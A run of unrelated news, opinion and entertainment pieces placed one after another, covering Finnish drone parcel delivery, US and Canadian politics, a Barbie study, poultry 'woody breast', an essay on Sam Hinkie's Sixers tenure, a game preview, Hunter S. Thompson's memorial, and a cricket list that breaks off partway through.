During the four-day test which started on Wednesday (September 2), the drones will be transporting parcels between mainland Helsinki and Suomenlinna, an island fortress some five kilometers from the city center.
According to Posti Group, it is the first company in Europe to experiment with unmanned aerial vehicles (UAV) for mail delivery in an urban area, with a flight path that is partially obstructed.
During the tests, parcels that weigh no more than three kilograms will be flown to the island by the drone, while letters and other parcels will be delivered the usual way by boat.
Jukka Rosenberg, Senior Vice President of parcel and logistics services at Posti, said the company was testing ways to make online shopping quicker and better for both the sender and recipient.
“This is part of the testing new technologies in our parcel delivery and post deliveries and this could be an opportunity which we are now testing,” he said following a press viewing on Tuesday (September 1).
The very first drone delivery went off without a glitch, even though it landed away from the designated landing zone.
Tero Heinonen from Sharper Shape, that is responsible for the technical aspects and operation of the drone, said safety was a priority and that the pilot had chosen a different landing spot because of the windy conditions.
“Safety is very important for us and the human pilot is always in charge of the flight and on this occasion it seems that the pilot made a decision to land further away from the crowd which had gathered here just as a safety precaution,” he said.
The parcel was then handed to the Minister of Transport and Communications, Anne Berner.
The test comes after her department drafted a program to promote intelligent automation.
According to Posti, Finland is at the forefront of using new technologies for transportation with legislation and public authorities strongly encouraging work in the field of automated traffic.
Heinonen said there was great interest in drone technology and said there were many potential uses.
“It seems that drones are one of the new technology areas which really ignite people's imagination, so we get probably twenty requests per week for different applications that we ever could not have imagined. So I expect that while the technology further matures we will see many companies doing different kinds of applications starting from precision agriculture, forestry inventory, the deliveries of course, power-line inspections, counting traffic,” he said.
The announcement by Amazon last year of a potential drone-based delivery service has excited consumers, but a number of major obstacles remain before drone delivery services become the norm, namely weight limits, distance limits, and weather restrictions.
The Vancouver Housing Reset Report, the BC Greens have some policy and a New Conservative Dinner Party.
Segment 1 – Hitting the housing reset button
Vision Vancouver has released a new report that looks at the housing crisis and how to fix it. We take a look at how it holds up and question some of its terminology.
Segment 2 – Weaving a platform
The BC Greens are slowly but steadily trickling out a platform that shows they're about more than just hugging trees. But what's really in there and will it be enough to differentiate the party from the two big voices?
The Story of Mouseland:
Ian's extra note: After we recorded this, I saw Vaughn Palmer's alternate take on the Green's environmental platform. He argues it's significantly different than the NDP's. Since I edited this episode, I stand by my analysis for the most part.
Segment 3 – The Right kind of Conservative
Scott Gibson's “Confessions of a self-loathing Tory” column in Maclean's is sparking renewed conversation about launching a new Conservative Party, or at least dinner parties toward that goal.

A play has brought parts of the 2016 presidential debates to the stage but with an added twist: Donald Trump is played by a woman, while Hillary Clinton is played by a man.
Maria Guadalupe, an associate professor of economics and political science at INSEAD, joined forces with Joe Salvatore, an associate professor of educational theater at NYU's Steinhart School to develop Her Opponent, a play featuring actors performing excerpts from the three debates verbatim but with the genders of the candidates switched, NYU News reports.
The play gave different names to the Trump and Clinton characters, calling Trump's persona “Brenda King” and Clinton's persona “Jonathan Gordon.” A third actor played the moderator in the debates.
The audience's reaction to the play brought some interesting results. Salvatore and Guadalupe originally predicted that even though the candidates' genders were reversed, the candidates' personalities would match those portrayed in the real-life debates. But the results were exactly the opposite of what they predicted.
Guadalupe wrote in a reflection on the experiment:
It was an unusual experiment which sparked some surprising reactions in a talkback session after the events. The expectation, held by myself and the majority of people polled before the performance, had been that Clinton would look “more presidential” as a man and Trump's lack of respect for, and aggression towards, his opponent would not be tolerated in a woman. Our predictions were way off.
Audience members found that the arguments from Trump's character sounded more convincing coming from a woman.
“About halfway through watching this it hit me – I see how he (Trump) won,” one audience member commented.
They also agreed that many of the arguments coming out of the Clinton character's mouth seemed less believable and said that the character came off as “untrustworthy” or “fake.”
“I expected to feel validated in my beliefs,” a left-leaning member of the audience noted. “But I thought Gordon was weak. I found myself expecting him, as a man, to attack more.”
The experiment challenged people's perceptions of gender, even if it did not change people's opinion of the two candidates.
“It gave people enough distance to reflect on their own deeply ingrained gender bias, and to think about how they might have better understood the debates and the other perspective if they had not held such strong preference or distaste for a specific candidate,” Guadalupe said.
Her Opponent was performed at the Provincetown Playhouse in the West Village in New York City in January, and there is a plan to shoot and edit a re-creation of the play.

Ever wonder what bizarre alchemy is holding together the defense of Donald Trump and his GOP allies against charges of collusion with Russia? GOP strategist Rick Wilson offered an answer in an epic 13-tweet takedown, and it's not pretty.
The formula he reveals includes early-onset dementia, lies, and worse: pitted against the findings of the US intelligence community (IC) is a ‘bullshit tornado' of “Spells of Forgetting” and “rejected X-Files scripts.”
As former Clinton-era White House staffer Claude Taylor observed, this is “State of the Art Twitter.” Read on, and enjoy the epic takedown:
There are still a few Republicans on the committee who believe Yates can be a foil for the dumb “unmasking/leakers” strategy. This is dumb, because it was led by Devin “Patsy” Nunes on direct orders from WH/Bannon. This basal, twitch-reflex “But Obummer” defense of Trump's Russia ties is understandable but also literally betting the GOP's future on Trump and his team telling House GOP Intel Committee members the truth.
Given Trump is a serial fabulist surrounded by the same does this strike any Republican in the House as a good bet? That the denials don't come with caveats, exceptions, codicils, memory lapses, early-onset dementia, attorney-client privilege, Spells of Forgetting, lies, obfuscations, lacuane [sic], evasions, rejected X-files spec scripts, and his usual tenuous ability to tell the truth about simple facts like the day of the week and his own name. So keeping up the bullshit tornado as per the last hearings is a weak hand.
It's also been VERY clear the House Intel staff has had enough. The GOP members know now that the Trump/Russia intel didn't come DOWN from the Obama WH but UP from organic collection. The hissy-fit, stompy-foot “conservative” writers trying to turn this into the Evil Kenyan Muslim Sleeper Agent's Dirty Tricks are free to continue. Soldier on, clickservative warriors. Soldier on.
And the concluding three tweets:
12/ Two final points. A. Never forget; you WANTED this war with the IC. You trusted Trump and the Russian IC over our own. Your call. — Rick Wilson (@TheRickWilson) April 21, 2017
13/ B. Trump: a pair of twos. IC: Royal flush. So endeth. — Rick Wilson (@TheRickWilson) April 21, 2017
They sure did. We warned them. Many times. Did they listen? Epic tweetstorm, btw. https://t.co/sKiXzXLaqP — John Schindler (@20committee) April 21, 2017
As a postscript, Texas “faithless elector” Christopher Suprun, who made news by not casting his vote for Trump, asked Wilson, “Do you really think Trump's hand is a pair of twos? Is it even that good?”
Wilson's response: “If that.”
Former NSA analyst John Schindler, who has told the GOP that a war with the intel community can only “end in tears,” added his thoughts, concluding with the observation that,
“‘Conservatives' now rebranding routine FVEY/NATO intel sharing as ‘collusion with foreign spies” to save TrumPutin.'”
Yes. They're that desperate. Investigating Trump's spy scandal is the “real” spy scandal according to Trumpists.
Trump's Republican defenders are going to feel pretty foolish when it comes time for POTUS to lay his cards on the table and he can't even show a pair of 2s. In the vernacular, it ain't gonna be pretty.

Sherman and her research partner say the study proves that girls, even at a young age, can recognize the sexualized nature of Barbie, as well as her unrealistic body shape, and that these things feed into a girl's understanding of gender roles.
Playing with a Barbie doll could limit a girl's view of her own career potential compared to that of boys. Playing with a Mrs. Potato Head doll doesn't have the same effect, according to to a study from Oregon State University.
The study, which included a researcher from the University of California, was published in the journal "Sex Roles."
It's not the only news this week about Barbie, who turns 55 this year. But more on that later.
"Playing with Barbie has an effect on girls' ideas about their place in the world," said Aurora M. Sherman, associate professor in the School of Psychological Science at OSU, said in a written release about the study. "It creates a limit on the sense of what's possible for their future. While it's not a massive effect, it is a measurable and statistically significant effect."
"Perhaps Barbie can 'Be Anything' as the advertising for this doll suggests, but girls who play with her may not apply these possibilities to themselves," Sherman told United Press International. "Something about the type of doll, not characteristics of the participants, causes the difference in career aspirations."
"Sherman and her research partner say the study proves that girls, even at a young age, can recognize the sexualized nature of Barbie, as well as her unrealistic body shape, and that these things feed into a girl's understanding of gender roles," wrote UPI's Brooks Hays.
Barbie was introduced in 1959. She is considered the first fashion doll because her appearance and clothing are an integral part of her appeal to little girls. OSU noted in its release that "past research has found that the way fashion dolls such as Barbie are physically formed and dressed communicates messages of sexualization and objectification to girls."
In the study, 37 girls ages 4 to 7 were randomly given one of three dolls: gussied-up Barbie in heels and dress; career Barbie dressed as a doctor; or Mrs. Potato Head with shoes and purse. That was the "control," because although she, too, was dressed and had similar color and texture, she lacked Barbie's sexualized characteristics, the researchers said.
The girls played with their dolls for a few minutes then answered questions about whether they could do any of 10 different jobs when they grew up. They were also asked if boys could. The careers were divided between those that are traditionally male-dominated and female-dominated.
Girls who played with Mrs. Potato Head thought they could have more career options than those who played with Barbie. And it didn't matter what Barbie was wearing, those who played with her pictured themselves in fewer careers than they could picture the boys doing: "Results support predictions from gender socialization and objectification theories," the study said.
Sherman said one toy isn't likely to alter a child's career aspirations, but toys can influence a child's ideas about his or her future. That means, she added, that parents should make certain that children have a wide variety of toys with which to play.
Meanwhile, Mattel's Barbie was getting attention for being featured in the annual Sport Illustrated swimsuit edition. In announcing her photo shoot, the Swim Daily staff at Sports Illustrated called her a "rookie-legend" but said it's "not buying her 'no plastic surgery' claim." There's a clever "photo shoot" where she is praised for such superior model qualities as an ability to hold a pose, not blink when photos are taken, and provide an endless, consistent smile. To hear the photographer who did the photo shoot talk about her, she's a real doll to work with.
Barbie tweeted about the shoot herself, with the hashtag "unapologetic."
In a brief story about Barbie, CNN noted that "when Barbie burst onto (the) scene in a black and white swimsuit in 1959, she was considered a rebel who embodied both "the sensuality of Marilyn Monroe and the innocence of Debbie Reynolds."
Stories are also heralding the approach of an anti-Barbie, a plastic doll with similar coloring but more humanlike measurements. The Atlantic said that Lammily, as the doll is being called (most likely a nod to her graphic designer "dad," Nikolay Lamm), looks much more realistic than Barbie.
Lamm calls her "Normal Barbie" and has based her body shape "on averages of data from the U.S. Centers for Disease Control that is more often used to track the American obesity epidemic. She is not affiliated with Mattel's Barbie," the article said.
He plans to fund her production through crowd-sourcing, but as of this writing has raised less than a third of what is being sought.
The poultry industry has a fowl problem: an emerging phenomenon called "woody breast."
While it's not harmful to humans, the condition causes chicken breasts to be tougher because of hard or woody fibers that lace the meat. As much as 10 percent of boneless and skinless breast meat may show signs of woody breast, according to The Wall Street Journal.
Even though it's harmless to humans, diners aren't exactly pleased when they're served up a plate of woody chicken. In one study, a consumer panel described the affected meat as "tough," "chewy" and "doesn't feel right in the mouth." That's prompting the poultry industry to turn its resources to figuring out what's going on with its chickens.
New law affects chicken farms in California
"The causes at this point are unknown, which is why the industry is spending more than a quarter of a million dollars on four separate research projects through the U.S. Poultry & Egg Association to have all of these questions answered," Tom Super, spokesman for the National Chicken Council, told CBS MoneyWatch.
In a twist, one potential culprit may lie in how the poultry industry has supersized itself by breeding chickens that are now more than twice as large as they were in the 1920s. Back then, the average chicken weighted 2.5 pounds, but chickens today weigh an average of 6 pounds, according to the National Chicken Council.
Breeding for bigger, faster-growing chickens could be tied to the emergence of woody breast, The Journal noted, citing food scientist Massimiliano Petracci.
While it's unappetizing to diners, the emergence of woody breast could spell financial problems for chicken producers such as Perdue Farms. Given consumer reluctance to eat tough chicken breasts, that could lead some producers to sell the meat at a lower price or even to breed smaller chickens in an effort to eliminate the problem.
"The chicken companies will have employees in processing plants looking at every piece of breast meat for any quality issues," Super said. "If found, affected meat is pulled from the line, typically sold at a discount and then further processed or ground for products like chicken sausage."
The next battle in the Israeli-Palestinian conflict will be fought on the pages of the internet site Wikipedia, a free online encyclopedia which anyone can edit.
Abed A-Nassar, chairman of the Association of Palestinian Journalists, has already begun preparing for the conflict, calling on Palestinian institutions to make Wikipedia pages more pro-Palestinian.
His call follows a recent article in Haaretz on a class organized by settlers to teach supporters how to register and edit Wikipedia pages, in order to make them more representative of the 'Zionist' viewpoint.
Organizers of the Israeli course say their aim is twofold: to affect Israeli public opinion by having people who share their ideological viewpoint take part in writing and editing for the Hebrew version, and to write in English so Israel's image can be bolstered abroad.
Palestinians must now launch a counter-attack against Israel's latest "public relations war", Nassar said.

Sarah Jessica Parker may have hinted at another Sex and the City movie, but her former TV love John Corbett wants even more.
"I think there are a lot of stories to tell," Corbett, who played Carrie Bradshaw's furniture designer beau Aiden on the series, told me yesterday while promoting his new thriller The Boy Next Door (in theaters on Jan. 23).
Corbett says SJP should take a page from another beloved HBO series. "There's a lot of story left to tell with those women and if HBO got it together, I'd like to see the show come back for a couple of seasons like The Comeback," he said, adding, "I'd like to see them come back for, you know, eight or 10 episodes a year for a couple of more years."
Um, we are so down for that!
Marvel has found the star on their next giant movie, Ant-Man.
Paul Rudd had been chosen to star in the movie, which is being directed by Edgar Wright and already has a release date of July 31, 2015.
Rudd was in contention for the role with Joseph Gordon-Levitt, and although Rudd was the front-runner for some time, Marvel took its time pulling the trigger. Some speculate that when Gordon-Levitt became attached to Sandman, based on a character by Marvel's rival, DC Entertainment, that only hastened the dealmaking.

Ant-Man could be Marvel's more quirky offering since it's in the hands of Wright, a director known for his fan-favorite films such as Hot Fuzz and The World's End, which balance action, sci-fi and comedy.
Rudd's front-runner status was an open secret. What is more of interest to fanboys and girls is which Ant-Man is Marvel adapting. The script calls for the original hero, a scientist named Dr. Hank Pym who invents the shrinking technology (called Pym Particles!) and was one of Marvel's earliest heroes. But it also has Scott Lang, a reformed thief who became the hero in the late 1970s.
It's about an hour before sunset in early August, and I'm ecstatic. The Sixers, a team I've was born, bled, and died for have just made a move to shake the foundations of the NBA to their core. In the moment, I'm convinced that this will live on as one of the most important decisions in Franchise history. Feverish with excitement, I tell anyone who'll listen that this bold, table-flipping move will change the fate of a team long trapped in the swamps of mediocrity.
In the end, I was right, but for all the wrong reasons. The day way August 10th, 2012, and the move in question was the infamous trade that brought Dwight Howard to the Lakers, Andre Iguodala to the Nuggets, and the one and only Andrew Bynum to the Philadelphia 76ers. Bynum would never play a single game for Philadelphia, and today the trade is mostly remembered for almost single-handily obliterating two of the league's most historic franchises in Philly and LA.
But at the epicenter of basketball's Chicxulub Crater, something began to grow. Something new and revolutionary, unprecedented and incorrigible. The kind of shocking upheaval that requires the tremendous energy of an unmitigated disaster in order to kickstart it, and whose roots can only take hold in its immediate fallout. In the offices of the Wells Fargo Center, an idea was presented to a still fresh-faced ownership group, convincing them that, rather than sit and lick their wounds, the Sixers should burn the ships and plunge unfazed past the edge of the known world and into the uncharted lands of mist and dragons.
The man behind this idea, of course, was Sam Hinkie, the now former General Manager of the Sixers. At 2 years, 10 months, and 24 days, his tenure as the head of the Sixers Front Office seems shockingly brief compared to the impact it had on the league; usually, that's the sort of tenure that becomes a footnote in a franchise's history books. Instead, it will be forever remembered as one of the most talked about, polarizing, and hotly contested periods since the dawn of the NBA, thanks to the new paradigm Hinkie brought to the table with him. It was the genesis of more think pieces and op-eds than could be read in a dozen lifetimes; it dragged an existential debate over the nature of the NBA and “tanking” in sports to a national forefront; it inspired feverish, near cult-like levels of worship to an ideology now referred to almost mythically as “The Process”. The ramifications of this one simple idea crash over the league like aftershocks from an earthquake, and in truth years may pass before we truly feel the full impact they had on the NBA and sports as a whole.
And the idea behind it all can be summed up in one word: Honesty. That may sound paradoxical if you've only followed the media's account of him as a “secretive” or “shady” GM. His feud of silence with the local sports media will be the stuff of legends for years to come, and it gave rise to a narrative that Hinkie was running a shell game while keeping Sixers fans in the dark. But I contend that, from his first day on the job to the second he tendered his resignation, no figure has ever been as blatantly, brutally, and unrelentingly as honest as Sam Hinkie. Honesty was the core of every decision he made. Honesty was the motor behind his entire philosophy as a General Manager. And, in the end, unabashed and uncompromising Honesty is what undid him.
The truth is, for all the joy it brings us, the NBA is intrinsically and undeniably broken. It's a game that requires you to have already won to have a chance of winning; to be successful, you need to have already succeeded. We've reached the point in the NBA where, to contend, you need starting five stacked with at least two, preferably three “Star” players. Fee Agency won't help you much either; a salary cap filled with a myriad of exceptions and allowances gives the home team the upper-hand in every bidding war. The only guaranteed way to level the playing field, in fact, is to already have a star player in your locker room to help with your sales pitch. And so the fact is, the only way to the top is through the bottom, either through the draft or the accumulation of assets for a trade. The reality is that there can never be a celebration in the NBA that isn't paid with the excruciating pain of failure.
The NBA has spent decades concocting ways to keep this truth hidden. Words like “heart”, “hustle”, and “grit”, phrases like “playing the right way” and “winning culture”, the idolization of doomed campaigns, moderate successes, and small victories; all these things and more were thrown up in neon lights to keep eyes drawn away from the cracks in the foundation. Attempts to subvert this truth by taking the most direct path to success were demonized, and their proponents vilified. “Tanking” became monster under the bed, the boogeyman in the NBA's closet, the strawman that was the true source of all the league's problems. Sooner or later, every would-be agitator was browbeaten into playing along with the league's charade.
But no matter what they did, they never broke Sam Hinkie. Again, more than any other figure in the history of modern sports, Hinkie was honest. He was honest to the fans about the hopeless position their hollowed out team was in when he's joining the franchise. He was honest with the players about their place in the NBA and the obstacles that were in front of them. He was honest to the owners about the painful, seemingly impossible climb to the top that laid before the Sixers. And most of all, he was honest with himself about what needed to be done. From the minute he sat down as Philadelphia's GM, Sam Hinkie stripped away every comforting platitude, every half-hearted reassurance, and every league-approved falsehood until only the cold, brash, abrasive truth remained, and rather than hide from it, he put it on display at the Wells Fargo Center for Philadelphia and the entire world to see.
And he was uncompromising. His respect for the game and its players and the countless people who live and breathe this sport was too encompassing to indulge in the easy lies that the rest of the NBA partook in. There were no side steps to greatness; no lateral moves, no “feel-good”, no attempts to promote hollow victories in the form of mid-level free agent signings or settling for good when greatness lingered on the horizon. He knew what needed to be done in order to truly thrive in this league, and he would accept absolutely nothing less. Hinkie put more trust in the fans than any other GM in the history of the league, and I for one had never felt more involved with the decision making of a sports team than I did during his tenure. In the end, it turned out to be his downfall; the majority of the basketball world, it seemed, wasn't ready to give up the charade just yet. But those of us in who were, it was nothing short of liberating.
Look, despite what the tone of this writing may have you believe, Sam Hinkie isn't dead. He still woke up this morning with one of the best basketball minds in nation, and I have no doubts he'll find a job somewhere in the league far sooner rather than later. But at the same time, something did seem to slip away in South Philly on the evening of April 6th. Watching Joshua Harris stumble through prepared talking points and blatant lies, you could almost feel the destruction of everything Hinkie stood for. Gone was a belief that sports should exist without the need for positive spin or plastered smiles. “The Process”, in the end, was nothing more than stripping the shiny, candy-coated veneer off wheat thresher that is the modern NBA and finally being honest with fans, players, the media, and everyone else about what it takes to make a champion. But as Bryan Colangelo took the reins of the Sixers Front Office and his father Jerry uninstalled Skype from his laptop, that soulless cover of false assurances was slipped right back on.
Again, I'm thinking of that night in August, and all the unfulfilled hope it held. In a way, the arrival of Sam Hinkie was akin to that of Andrew Bynum. Both will now be remembered as the harbingers of broken faith and unrealized promises, but in this case, it is again for all the wrong reasons. While the promises of the Bynum trade ended up being nothing but shadows on the wall, the promises Hinkie were real and concrete. There was a true path forward, and true route to the promise land, if only we had the strength of character to accept it. Sam Hinkie was an honest man, but he made the mistake of trying to win a dishonest game.

So far, we've only been able to play BioWare's upcoming MMO in restricted and supervised environments. Well this week the blast doors have been blown open, the tractor beam has been powered down, and we've been exploring the galaxy in the new beta to uncover everything we can learn about the game. Today we're bringing you a look at the starting experiences for the Republic faction.
Players on the Republic side choose from four classes, each of which is assigned to one of two starting planets. The Jedi Knight and Jedi Consular each begin as Padawans on the ancient Jedi homeworld of Tython, while the Smuggler and Trooper classes each find themselves stuck in the midst of a civil war on Ord Mantell. Each of the stories, particularly the smuggler's, begins with a hook that gets you right into the action, helping you understand not only who your character is, but also the larger context of the world around you.
BioWare's promised to bring meaningful storytelling to the MMO genre and, based on the starting planets at least, that promise has been fulfilled. For one thing, all the content on the starting planets revolves around a single theme. On Tython, it's the appearance of a strange group of hostile aliens. On Ord Mantell, it's the war between the Separatists and the Republic. Every single quest bears some relation to the larger story and even the smaller side chapters where you're helping Twi'Lek pilgrims or Republic refugees fit the overall context of each world. It's a great way to keep the players focused on a single purpose for the first ten levels of play.
Each character also experiences the game from a unique perspective. Though you're running through the same areas, fighting the same sorts of enemies, the Smuggler's experience of the civil war is very different from the Trooper's. The Smuggler's story kicks off when his ship is stolen, so all his interactions with Republic officials, refugees and Separatists revolve around trying to get the ship back and taking revenge on the person who stole it. The Trooper is very different. He or she has been sent to the planet to help put down the Separatists and experiences the content through a different lens.
What makes it work is that BioWare explores the drama through the stories of individuals and relates it all to your character's motivations. For instance, at one point my smuggler was sent to rescue a boy who had been taken captive by the Separatists and, while the plot details are interesting by themselves, I was even more impressed by all that the mission accomplishes. First, it advances the overall narrative of the war between the Separatists and the Republic. Second, it tells you what the Separatists are all about. Finally, it allows your character to respond to the situation in a way that expresses your own values. Do you help the kid? Do you force him to do what you think is the right thing? Do you even tell his parents he's alive? There are lots of examples of this in each character's story, from deciding whether or not to expose a pair of Jedi lovers, or pondering whether to destroy a shipment of weapons or hand them over to a group of threatened people.
BioWare's storytelling in The Old Republic follows the same format as its other RPGs. In other words, all the story is delivered through talking heads and cutscenes. While it's an effective and familiar approach, I hope that the game begins to reveal more of the story through the actual gameplay and environments. It's true that the settings themselves provide a mood that helps support the overall tone of the story, but for the most part, the story bits are still stuck in the conversations. On the plus side, the dialogue and acting are top notch, and the range of responses your character can give definitely help you get in a roleplaying frame of mind.
Washington (CNN) Ted Cruz failed to disclose hundreds of thousands of dollars in loans from the nation's largest banks when he ran for the Senate in 2012, a potential violation of federal election rules.
Cruz did not report to the Federal Election Commission two personal loans from Citibank and Goldman Sachs, where his wife works, during his come-from-behind win in the Texas Republican primary, campaign spokesman Catherine Frazier confirmed Wednesday.
The senator did eventually list the loans on personal financial disclosures, but the Cruz campaign acknowledged the mistake after the New York Times report was published.
"These loans have been disclosed over and over and over again," Cruz told reporters quickly after the news broke. "It is an inadvertent filing question. The facts of the underlying matter have been disclosed for many, many years."
Frazier said the loans from Goldman and Citi were borrowed against their own money -- the couple sold stocks and liquidated their savings to finance the bid. She estimated the total loans were less than $500,000, and said he did not receive any special terms and has now paid off the loan. They are planning on working with the FEC to amend their prior filings, Frazier said.
"Now we realize that we should have disclosed it, yes," Frazier told reporters in South Carolina. "It's a matter of semantics in terms of listing that that was a loan and we're asking the FEC what we need to do to update it, if anything."
The news, on the eve of the next Republican debate in South Carolina, could pose a political problem beyond the arcane campaign finance requirements. Cruz's brand of Republicanism is cold toward concerns of major financial institutions, and he has pitched himself as a populist, evangelical everyman who gained political power through hard work and an appetite for risk.
Cruz frequently shares with audiences the decision by his wife, Heidi, and him to empty their assets into the campaign bank account in order to compete with Lt. Gov. David Dewhurst, the overwhelming favorite in the crucial Senate Republican primary who invested $25 million of his own money. But he has not spoken of the loans from the financial giants, which are still politically unpopular after the financial crisis of 2008.
When asked by CNN's Dana Bash how he squared his image with the large loan from Goldman Sachs, Cruz played up the hard decision to pour their income into the Senate run.
"The premise of your question is not right," he said. "Heidi and I when we ran for Senate, we made decision to put our liquid net worth into the campaign."
Federal election records show Cruz extended loans of more than $1 million to his campaign during the 2012 cycle. Personal financial disclosure forms later filed show loans in that period totaling hundreds of thousands of dollars and as much as an additional $1 million.
Campaign aides on Wednesday were publicly treating the fracas lightly, sharing other examples of #CruzCrimes on social media and downplaying it as nothing more than a clerical overlook. A top aide to a rival campaign described the revelations as a cheap shot and non-issue.

With a deafening boom, the ashes of Hunter S. Thompson were blown into the sky amid fireworks late Saturday as relatives and a star-studded crowd bid an irreverent farewell to the founder of “gonzo journalism”.
As the ashes erupted from a tower, red, white, blue and green fireworks lit up the sky over Thompson's home near Aspen.
The 15-story tower was modeled after Thompson's logo: a clenched fist, made symmetrical with two thumbs, rising from the hilt of a dagger. It was built between his home and a tree-covered canyon wall, not far from a tent filled with merrymakers.
“He loved explosions,” explained his wife, Anita Thompson.
The private celebration included actors Bill Murray and Johnny Depp, rock bands, blowup dolls and plenty of liquor to honor Thompson, who killed himself six months ago at the age of 67.
Fans scramble to catch a glimpseSecurity guards kept reporters and the public away from the compound as the 250 invited guests arrived, but Thompson's fans scouted the surrounding hills for the best view of the celebration.
“We just threw a gallon of Wild Turkey in the back and headed west,” said Kevin Coy of Chester, W.Va., who drove more than 1,500 miles with a friend in hopes of seeing the celebration. “We came to pay our respects.”
Thompson fatally shot himself in his kitchen Feb. 20, apparently despondent over his declining health. The memorial, however, was planned as a party, with readings and scheduled performances by both Lyle Lovett and the Nitty Gritty Dirt Band.
The author's longtime illustrator, Ralph Steadman, and actor Sean Penn were on the invitation list, along with Depp, who portrayed Thompson in the 1998 movie version of “Fear and Loathing in Las Vegas: A Savage Journey to the Heart of the American Dream,” perhaps the writer's best-known work.
“Over the last few months I've learned that he really touched people more deeply than I had realized,” said Thompson's son, Juan.
Too much show for someThompson's longtime friend George Stranahan lamented the Hollywood-style production. “I am pretty sure it isn't how Hunter would have done it,” he said. “But when your friends make a mistake you support them.”
Anita Thompson said Depp funded much of the celebration.
“We had talked a couple of times about his last wishes to be shot out of a cannon of his own design,” Depp told The Associated Press last month. “All I'm doing is trying to make sure his last wish comes true. I just want to send my pal out the way he wants to go out.”
Pioneer of ‘gonzo' journalism
Thompson is credited along with Tom Wolfe and Gay Talese with helping pioneer New Journalism — he dubbed his version “gonzo journalism” — in which the writer was an essential component of the story.
He often portrayed himself as wildly intoxicated as he reported on figures such as Jimmy Carter and Bill Clinton. At the height of the Watergate era, he said Richard Nixon represented “that dark, venal, and incurably violent side of the American character.”
Besides the 1972 classic about Thompson's visit to Las Vegas — in which the central character was a snarling, drug- and alcohol-crazed observer and participant — he also wrote an expose on the Hell's Angels and “Fear and Loathing: On the Campaign Trail '72.”
The Kentucky-born writer also was the model for Garry Trudeau's balding “Uncle Duke” in the comic strip “Doonesbury.”
An unabashed gun-toting ‘freak' In now-chic Aspen, Thompson was an eccentricity: He proudly fired his guns whenever he wanted, let peacocks have the run of the land and ran for sheriff in 1970 under the Freak Power Party banner.
Composer David Amram, a friend of Thompson since the early 1960s, said Thompson had never expected to be successful taking on President Nixon during the Watergate era. “He thought he would be banned or put on an enemies' list,” he said.
Thompson made himself the centerpiece of his stories “to show that a regular person could be in the midst of the craziness of the time,” Amram said. “He was our historian.”
After his suicide, one close acquaintance suggested Thompson did not want old age to dictate the circumstances of his death. Anita Thompson said no suicide note was left.

Without doubt, Marcus Stoinis' epic century against the Black Caps in yesterday's Eden Park epic will go down as one of the greatest ODI innings ever played for Australia.
Stoinis played with patience, poise and a truckload of power as he rampaged his way to within one lusty blow of levelling the scores in what would have been one of the most memorable comebacks in ODI history.
It wasn't to be, but Stoinis' masterful knock will long live in the memory of the 27,911 in attendance and the thousands, perhaps millions, who saw the vision of his savage stroke play.
Super Stoinis sets new all-round benchmark
In the wake of his stunning display, the question was raised as to where Stoinis' knock ranks in the best ODI innings of all time.
While that debate could rage on for days, even weeks, we've narrowed it down to the best lower-order centuries by Australians (from No.6 and lower), a list of eight that features some of the greatest names ever to play 50-over cricket in the green and gold.
8. Shaun Marsh

The numbers: 110 from 114 balls, 8x4, 2x6 v England in Hobart, 2011
The scenario: Batting first, Marsh entered at No.6 with Australia in the mire at 4-33 in the 13th over with Watson, Haddin, Clarke and David Hussey in the sheds.
The knock: Having been sent in by England skipper Andrew Strauss, Australia were in all sorts when Marsh strode to the crease. The left-hander was in the side as Mike Hussey's replacement and went about salvaging the innings just like Mr Cricket would do. He first formed a vital 103-run partnership with Cameron White before teaming up with Doug Bollinger – not known for his batting prowess – to put on 88 for the ninth wicket. Marsh was dropped on 61 by fast bowler Ajmal Shahzad and made the most of it by clocking 17 runs off spinner Michael Yardy in the 45th over to reach his second ODI century with a mighty six. Marsh's knock of 110 lifted the hosts to 230, a score that proved too great for England, who were bowled out for 184.
7. Mike Hussey
Hussey tons up on captaincy debut // Getty
The numbers: 109no from 90 balls, 10x4, 3x6 against West Indies in Kuala Lumpur, 2006
The scenario: In his first match as captain, Hussey won the toss and elected to bat. He then had to watch on as his top order fell apart, reduced to 4-64 in the 18th over as he walked to the crease.
The knock: In what would be become the first of many rescue missions for his country, Hussey teamed up with wicketkeeper Brad Haddin to put on 165 for the sixth wicket. In typical fashion, Hussey picked gaps, worked angles, rotated the strike and employed a full range of strokes, from the conventional to the unorthodox, to restore respectability to the scoreboard. He brought up his maiden ODI century in the 49th over with a consecutive four off speedster Jerome Taylor, then launched the quick for a six over deep backward square leg three balls later. Hussey and Haddin pushed the total to a competitive 6-272, but a Brian Lara blitz delivered the Windies a three-wicket win.
6. Mitch Marsh
Pressure relieved // Getty
The numbers: 102no from 84 balls, 9x4, 2x6 against India in Sydney, 2016
The scenario: Marsh passed his older brother Shaun on the way to the middle of the SCG with the score at 4-117 in the 22nd over having been sent in by India skipper MS Dhoni.
The knock: The pressure to break the shackles and score a century had been weighing on Mitchell Marsh ever since he made his international debut in 2011. With Australia against the ropes on what was a road at the SCG, Marsh finally delivered that triple-figure score. Before he could raise his bat in celebration, Marsh watched David Warner perform his signature century leap as the pair put on 118 for the fifth wicket. When Warner fell in the 39th over, Marsh and Matthew Wade scorched 85 from 52 balls to push the total beyond 300. With Marsh ensconced in the nervous 90s, Wade fell, leaving John Hastings to guide the allrounder to triple figures. After facing three dot balls on 99, Marsh whipped Ishant Sharma to the leg side for two to reach his maiden ODI century. Australia finished on 7-330, but it wasn't enough as Manish Pandey stole the show and India reached the target with two balls to spare.
5. Matthew Wade
The numbers: 100no from 100 balls, 7x4, 2x6 against Pakistan in Brisbane, 2017
The scenario: After they were whitewashed in the preceding Test series, Pakistan burst out of the gates in the ODI format, reducing Australia to 5-78 in the 17th over when Wade was called upon to bat.
The knock: Brought back into the Test outfit on the back of his batting prowess, Wade had struggled to produce the score in the whites that would silence his doubters. But in the green and gold uniform of Australia's ODI side, the Victorian played with cautious freedom to string together partnerships and navigate the hosts to a match-winning total. First, Wade and Glenn Maxwell put on 82 for the sixth wicket before the left-hander batted with the tail for partnerships worth 42, 23 and an unbeaten 33 for the last wicket. With one over to go, Wade was on 93 and on strike. From the second ball he hit Hasan Ali through cover for four. Two dot balls followed, building the tension at the Gabba before a pull shot from the penultimate delivery garnered two more runs, the second run full of risk but well worth the reward. With one ball left and one run needed, a leading edge brought about his 100th and most elusive run, which sparked delight from the crowd as well as a triumphant roar and release of emotion from the batsman. What's more, Wade's unbeaten century lifted Australia to 9-268, a score Pakistan fell 92 runs short of matching.
Wade hits top form with maiden ODI century
4. James Faulkner
The numbers: 116 from 73 balls, 11x4, 6x6 against India in Bangalore, 2013
